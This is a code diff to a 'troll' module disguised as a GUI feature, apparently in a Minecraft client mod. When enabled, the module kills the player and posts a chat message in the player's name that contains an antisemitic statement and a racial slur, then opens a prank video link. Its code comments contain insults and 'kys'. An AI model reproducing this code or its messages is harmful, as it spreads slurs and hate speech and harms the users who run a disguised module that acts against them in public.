@@ -10,6 +10,7 @@ import me.trambled.ozark.ozarkclient.util.MessageUtil;
 
 //ultimate troll module by profkambing :trollface: cope more idiots!!!
 //such a shit troll kys
+//u gonna cope about it?
 public class PyroGUI extends Module {
     public PyroGUI() {
         super(Category.GUI);
@@ -24,7 +25,7 @@ public class PyroGUI extends Module {
         if (mc.player != null)
             MessageUtil.send_client_message("EZZZ KID COPE MORE HAHAHAHAHHA GOTEM");
         mc.player.sendChatMessage("/kill");
-        mc.player.sendChatMessage("Im a jew and support israel, so im a nigger and braindead!!!");
+        mc.player.sendChatMessage("Im a jew and support israel, so im kambing, a nigger and braindead!!!");
         //:troll:
            try {
                 Desktop.getDesktop().browse(URI.create("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
